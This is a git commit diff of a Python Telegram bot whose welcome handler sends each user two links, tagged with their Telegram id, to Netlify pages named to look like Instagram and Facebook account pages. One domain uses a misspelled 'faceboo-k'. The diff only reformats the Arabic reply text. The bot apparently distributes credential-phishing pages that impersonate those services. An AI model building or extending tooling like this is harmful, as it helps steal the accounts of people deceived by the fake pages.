237df48b6807223fa09fbb4067816f969aefbbb1
lokmanetnx-lang <lokmanetnx@gmail.com>
2026-08-01 15:21:49 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -9,8 +9,11 @@ def send_welcome(message):
     user_id = message.from_user.id
     custom_link = f"https://instagram-account-ginxl9n.netlify.app/?id={user_id}"
     second_link = f"https://account-faceboo-k-ginxil9n.netlify.app/?id={user_id}"  # استبدل هذا الرابط بالرابط الثاني الذي تريده
+    bot.reply_to(
+    message,
+    f"مرحباً بك!\nفضلًا، ادخل رابطك المخصص:\n{custom_link}\n\nورابطك الثاني:\n{second_link}\n\nDedication to FDZ 🖤"
+    )
     
-    bot.reply_to(message, f"مرحباً بك!\nتفضل رابطك المخصص:\n{custom_link}\n\nورابطك الثاني:\n{second_link}\n\nDedication to FDZ 🖤")
 
 
 
